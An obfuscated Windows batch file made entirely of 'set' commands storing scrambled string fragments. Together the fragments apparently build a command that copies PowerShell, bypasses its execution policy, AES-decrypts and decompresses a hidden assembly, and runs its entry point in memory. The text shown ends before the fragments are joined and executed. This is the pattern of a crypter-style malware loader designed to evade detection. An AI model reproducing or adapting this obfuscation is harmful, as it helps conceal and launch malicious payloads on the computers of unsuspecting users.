@echo off
set "hzyxNmxdwL=Sy"
set "NXFAUDqbNd=he"
set "zGJFpeRLqb=he"
set "rYalwOxvZT=we"
set "DpPVHUorfn=Po"
set "FIshNPDpcD=1."
set "xvHVcHLDzw= /"
set "CAayhFrCcA=\W"
set "QQrHlfhzdj=ll"
set "QVDBvqRaLS=in"
set "DOHVHUMSKe=\v"
set "IBRNXvsGOi= C"
set "HRQYHutAqS=xe"
set "yJCWlCpGYX=rS"
set "eiLAYIgPnj=0\"
set "FAgvcLMCHu=s\"
set "xQCMJctnoH=ll"
set "mXOogCnSir=Wi"
set "kLQuLgQGOY=.e"
set "PRSADnmGkc=32"
set "LgcyIgDwCo=py"
set "nDdNOcglPO=y "
set "jbrrtKYNXv=po"
set "uGHYWLhIaf=do"
set "YRIyLUSRwy=em"
set "cmnSgfrSgB=co"
set "ydlLCvdhXZ=rs"
set "lKBGnXAdpg=:\"
set "ooFWDxQkrg=ws"
set "DaiEtBUQZf=st"
set "wmUrIWTcCv=we"
set "uZmyjBuzUL=nd"
set "NLdYpaEwkK=ow"
set "WGfYGmvovc=cd"
set "IyIfJVckGc= %~dp0"
set "DXiCCtZwKj=S46e"
set "AGRYmGyKZC=.Cre"
set "mjUMZPqRBi= = $"
set "OHzHfHillz= [st"
set "EYbNajTiPZ=.Mem"
set "cwtslxomur=Wyqo"
set "MkfRTkWCFC=ddin"
set "TBtqzaguSK=ion."
set "TJqOglbDRH=);$x"
set "WTLvxOAgmW=tem."
set "zjKahpJRpG=.Sec"
set "QYnJNQEhrC=;$Jq"
set "vcchheuWCU=2VUN"
set "NsBxtLLVQK=);$E"
set "GVDgtUtAiW=ring"
set "ibGeEwEUAy=oint"
set "mCmpYOyIXm=);$k"
set "xDQjglFoZz='[-1"
set "PucCUnjpkC=[Env"
set "jHDkpYqjgx=ose("
set "deSAdthHFV=$LJx"
set "gdVVyFwIkS=join"
set "CwlvhwYhDv= New"
set "xbXXmqFdex=$EPV"
set "LJWQxFGGvk= [Sy"
set "YFHTfOWVri=yq, "
set "BKjFcykQdK=orF'"
set "LszcNRpgIP=zSOT"
set "yYeFJuzFIT=stem"
set "dPiznfsRnk=New-"
set "QDIJtfqCJv=ct S"
set "lpUrAEFwLC= '')"
set "RenELyoJlx=tryP"
set "WsAMrUWoEH== $x"
set "ENNPaCzQom=.Ass"
set "BeIljHQkKj=nirt"
set "PJwwvtKkph=t Sy"
set "AGoHkVEWnA=fore"
set "oCqlfcpiXD=();$"
set "DUfSWmIBeM=OT);"
set "lIIPKfcPyC=ss -"
set "WpbtJgtZJm=Fina"
set "kZXCGNtbTa= '')"
set "UKLadGWnUE=morF"
set "TcuKQYFTSo=7;$x"
set "pXzBOrynvK=-ep "
set "zQOdBcFNiY=zSOT"
set "AyijzuWHPX=)($P"
set "IjiIydMKQf=$TzS"
set "BjPwcDepXl=16] "
set "jnRqeRDTQD=esaB"
set "nDjGwtKKBN=and "
set "BCZpvTqAqS=();$"
set "BptmQabtqs=Comp"
set "HnpxBRkBzD=vPNR"
set "pXinGHzCuT=.Len"
set "ZGFnWxlciz=-joi"
set "jitZTKfLSs=oin "
set "igDUyKXKzg=y.Ci"
set "TemYJpUaOB=le  "
set "KvQVCFYYFy=lit("
set "IJdtnodbrn=.Dis"
set "pzOwcjicfl=.Com"
set "obMjLYLeZz=pher"
set "PaXTNxudsC=('%*'"
